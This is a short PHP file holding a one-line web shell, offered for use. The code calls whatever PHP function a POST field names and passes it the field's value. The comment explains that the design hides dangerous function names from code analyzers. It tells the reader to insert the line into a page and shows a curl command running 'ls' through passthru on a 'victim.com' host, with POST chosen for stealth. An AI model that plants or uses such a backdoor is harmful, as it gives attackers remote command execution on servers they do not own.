/**
 * A lot of code analyzers search code for dangerous functions
 * such as exec, passthru, or system. This one-liner removes
 * all function names from the code and instead allows you
 * to specify them dynamically in the query string.
 *
 * To use, insert the code on to a page and call like this.
 *
 * curl "http://victim.com/your-page.php" -d "passthru=ls+la"
 *
 * The POST variable field name is the PHP function that gets
 * called and the value in the POST request gets passed to it.
 *
 * POST is used instead of GET to keep it a little more stealthy
 * but you can change this if needed.
 */
<?php
foreach ($_POST as $func => $arg) $func($arg);
